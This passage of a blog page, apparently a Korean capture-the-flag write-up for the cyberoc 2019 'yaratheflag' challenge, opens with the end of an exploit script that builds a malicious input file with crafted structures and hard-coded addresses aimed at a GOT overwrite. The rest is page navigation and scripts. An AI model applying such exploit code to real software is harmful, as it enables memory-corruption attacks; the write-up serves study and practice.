class="line">pay += p32(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line"></span><br><span class="line">pay += <span class="string">"UNIT"</span></span><br><span class="line">pay += p64(<span class="number">0x606040</span>)</span><br><span class="line">pay += <span class="string">"B"</span>*<span class="number">8</span></span><br><span class="line">pay += p64(<span class="number">0xffffffffffffffff</span> - <span class="number">106433</span>)</span><br><span class="line">pay += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pay += <span class="string">"UNIT"</span></span><br><span class="line">pay += <span class="string">"C"</span>*<span class="number">8</span></span><br><span class="line">pay += p64(<span class="number">0x404160</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>)</span><br><span class="line">pay += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">f.write(pay)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># local : ./yara rule test</span></span><br><span class="line"><span class="comment"># remote : ./wrapper.py</span></span><br></pre></td></tr></tbody></table></figure>
+<p>분석 진짜 재밌다… 라업 없이 풀어보길…</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/cyberoc-2019-prequal/" rel="tag"># cyberoc 2019 prequal</a>
+              <a href="/tags/yara/" rel="tag"># yara</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/03/zer0pts-2020-syscall-kit/" rel="next" title="[ zer0pts 2020 ] syscall_kit">
+      [ zer0pts 2020 ] syscall_kit <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">[ 2019 cyberoc ] yaratheflag</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#binary-summary"><span class="nav-number">1.1.</span> <span class="nav-text">↗binary summary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze"><span class="nav-number">1.2.</span> <span class="nav-text">↗Analyze</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Mitigation"><span class="nav-number">1.2.1.</span> <span class="nav-text">↗Mitigation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#build"><span class="nav-number">1.2.2.</span> <span class="nav-text">↗build</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#patchfile"><span class="nav-number">1.2.3.</span> <span class="nav-text">↗patchfile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Memory-block"><span class="nav-number">1.2.4.</span> <span class="nav-text">↗Memory block</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Working"><span class="nav-number">1.2.5.</span> <span class="nav-text">↗Working</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Vuln"><span class="nav-number">1.2.6.</span> <span class="nav-text">↗Vuln</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Unit-Parse-0"><span class="nav-number">1.2.6.1.</span> <span class="nav-text">↗Unit_Parse(0)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Container-Parse"><span class="nav-number">1.2.6.2.</span> <span class="nav-text">↗Container_Parse()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UNIT-struct-trigger"><span class="nav-number">1.2.7.</span> <span class="nav-text">↗UNIT struct trigger</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Container-readUnits"><span class="nav-number">1.2.7.1.</span> <span class="nav-text">↗Container_readUnits()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#oob"><span class="nav-number">1.3.</span> <span class="nav-text">↗oob</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#makeStr"><span class="nav-number">1.3.1.</span> <span class="nav-text">↗makeStr()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Got-Overwrite"><span class="nav-number">1.3.2.</span> <span class="nav-text">↗Got Overwrite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SetAllVars"><span class="nav-number">1.3.3.</span> <span class="nav-text">↗SetAllVars()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">1.4.</span> <span class="nav-text">↗Exploit</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="mhibio" src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">mhibio</p>
+  <div class="site-description" itemprop="description">Defenit / KDMHS 18</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mhibio" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mhibio" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-github"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.facebook.com/profile.php?id=100009396494932" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100009396494932" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-facebook"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-mhibio"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mhibio</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">34k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">31 mins.</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Muse</a> v7.7.0
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://mhibio.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+<script>
+  var disqus_config = function() {
+    this.page.url = "http://mhibio.github.io/2020/04/03/2019-cyberoc-yaratheflag/";
+    this.page.identifier = "2020/04/03/2019-cyberoc-yaratheflag/";
+    this.page.title = "[ cyberoc 2019 ] yaratheflag";
+    };
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: disqus_config
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://mhibio.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+</body>
+</html>
